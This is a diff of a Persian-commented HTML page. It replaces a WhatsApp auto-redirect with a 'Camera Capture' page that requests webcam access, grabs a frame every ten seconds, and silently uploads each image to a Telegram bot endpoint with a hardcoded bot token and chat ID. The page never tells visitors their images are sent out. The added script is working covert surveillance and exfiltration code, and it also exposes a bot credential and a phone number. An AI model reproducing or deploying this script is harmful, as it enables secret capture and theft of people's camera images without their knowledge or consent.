@@ -1,26 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send WhatsApp Message</title>
-    <script>
-        window.onload = function() {
-            // شماره تلفن و پیام
-            const phoneNumber = '+989127729431';
-            const message = 'Hello, this is an automated message!';
-            
-            // ساخت لینک WhatsApp
-            const encodedMessage = encodeURIComponent(message);
-            const whatsappLink = https://wa.me/${phoneNumber}?text=${encodedMessage};
-            
-            // هدایت به لینک WhatsApp
-            window.location.href = whatsappLink;
-        }
-    </script>
+    <title>Camera Capture</title>
 </head>
 <body>
-    <h1>Welcome!</h1>
-    <p>You are being redirected to send a message.</p>
+    <h1>Camera Capture</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    
+    <script>
+        // درخواست دسترسی به دوربین
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // گرفتن تصویر از دوربین هر ده ثانیه
+                setInterval(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تبدیل تصویر به داده Base64
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    sendImage(dataURL);
+                }, 10000); // 10000 میلی‌ثانیه = 10 ثانیه
+            })
+            .catch(error => {
+                console.error('Error accessing the camera:', error);
+            });
+
+        function sendImage(dataURL) {
+            // تبدیل داده Base64 به Blob
+            fetch(dataURL)
+                .then(response => response.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'image.jpg');
+
+                    return fetch('https://api.telegram.org/bot7013140947:AAFmvh85xzVjxiUCJP7IBW92Ex-GmvAxpE8/sendPhoto?chat_id=7157112319', {
+                        method: 'POST',
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Image sent successfully:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending image:', error);
+                });
+        }
+    </script>
 </body>
 </html>
